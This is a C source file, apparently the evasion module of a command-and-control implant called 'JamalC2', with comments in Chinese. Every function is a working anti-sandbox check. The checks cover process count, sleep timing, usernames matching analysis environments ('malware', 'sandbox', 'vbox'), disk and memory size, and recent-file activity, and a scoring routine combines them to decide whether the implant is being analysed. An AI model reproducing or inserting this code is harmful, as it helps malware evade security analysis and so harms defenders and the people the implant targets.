/*
 * JamalC2 Implant - Evasion Module
 * 反沙箱检测和规避能力实现
 */

#include "evasion.h"
#include "config.h"
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>


// === 辅助函数 ===

/**
 * 字符串转小写并检查是否包含子串
 */
static int contains_lowercase(const char *haystack, const char *needle) {
  char lower[256];
  size_t i;
  size_t len = strlen(haystack);

  if (len >= sizeof(lower))
    len = sizeof(lower) - 1;

  for (i = 0; i < len; i++) {
    char c = haystack[i];
    if (c >= 'A' && c <= 'Z') {
      lower[i] = c + 32;
    } else {
      lower[i] = c;
    }
  }
  lower[len] = '\0';

  return strstr(lower, needle) != NULL;
}

// === 检测实现 ===

int evasion_check_process_count(void) {
  HANDLE hSnap;
  PROCESSENTRY32 pe32;
  int count = 0;

  hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE) {
    return 0; // 失败时假设安全
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (Process32First(hSnap, &pe32)) {
    do {
      count++;
    } while (Process32Next(hSnap, &pe32));
  }

  CloseHandle(hSnap);

  // 进程数量过少可能是沙箱
  return (count < MIN_PROCESS_COUNT) ? 1 : 0;
}

int evasion_check_sleep_skip(void) {
  DWORD start, elapsed;

  start = GetTickCount();
  Sleep(SLEEP_TEST_MS);
  elapsed = GetTickCount() - start;

  // 如果睡眠被加速，可能是沙箱
  return (elapsed < SLEEP_THRESHOLD_MS) ? 1 : 0;
}

int evasion_check_username(void) {
  char username[256];
  DWORD size = sizeof(username);

  if (!GetUserNameA(username, &size)) {
    return 0; // 失败时假设安全
  }

  // 检查常见沙箱用户名
  if (contains_lowercase(username, "sandbox"))
    return 1;
  if (contains_lowercase(username, "malware"))
    return 1;
  if (contains_lowercase(username, "virus"))
    return 1;
  if (contains_lowercase(username, "sample"))
    return 1;
  if (contains_lowercase(username, "test"))
    return 1;
  if (contains_lowercase(username, "analysis"))
    return 1;
  if (contains_lowercase(username, "vmware"))
    return 1;
  if (contains_lowercase(username, "vbox"))
    return 1;
  if (contains_lowercase(username, "virtual"))
    return 1;

  return 0;
}

int evasion_check_disk_size(void) {
  ULARGE_INTEGER freeBytesAvailable;
  ULARGE_INTEGER totalBytes;
  ULARGE_INTEGER totalFreeBytes;

  if (!GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes,
                           &totalFreeBytes)) {
    return 0; // 失败时假设安全
  }

  // 转换为 GB
  ULONGLONG totalGB = totalBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL);

  // 硬盘太小可能是沙箱
  return (totalGB < MIN_DISK_SIZE_GB) ? 1 : 0;
}

int evasion_check_memory(void) {
  MEMORYSTATUSEX memInfo;
  memInfo.dwLength = sizeof(MEMORYSTATUSEX);

  if (!GlobalMemoryStatusEx(&memInfo)) {
    return 0; // 失败时假设安全
  }

  // 转换为 MB
  ULONGLONG totalMB = memInfo.ullTotalPhys / (1024ULL * 1024ULL);

  // 内存太小可能是沙箱
  return (totalMB < MIN_MEMORY_MB) ? 1 : 0;
}

int evasion_check_recent_files(void) {
  char recentPath[MAX_PATH];
  HANDLE hFind;
  WIN32_FIND_DATAA findData;
  int count = 0;

  // 获取最近文件夹路径
  if (FAILED(SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {
    return 0; // 失败时假设安全
  }

  strcat(recentPath, "\\*");

  hFind = FindFirstFileA(recentPath, &findData);
  if (hFind == INVALID_HANDLE_VALUE) {
    return 0; // 失败时假设安全
  }

  do {
    if (strcmp(findData.cFileName, ".") != 0 &&
        strcmp(findData.cFileName, "..") != 0) {
      count++;
    }
  } while (FindNextFileA(hFind, &findData));

  FindClose(hFind);

  // 最近文件太少可能是沙箱（新建的虚拟机没有用户活动）
  return (count < 10) ? 1 : 0;
}

int evasion_check_all(void) {
  int score = 0;

  // 每项检测加分，超过阈值判定为沙箱
  if (evasion_check_process_count())
    score++;
  if (evasion_check_sleep_skip())
    score += 2; // 时间加速权重更高
  if (evasion_check_username())
    score += 2; // 用户名权重更高
  if (evasion_check_disk_size())
    score++;
  if (evasion_check_memory())
    score++;
  if (evasion_check_recent_files())
    score++;

  // 总分超过 2 判定为沙箱
  return (score >= 2) ? 1 : 0;
}
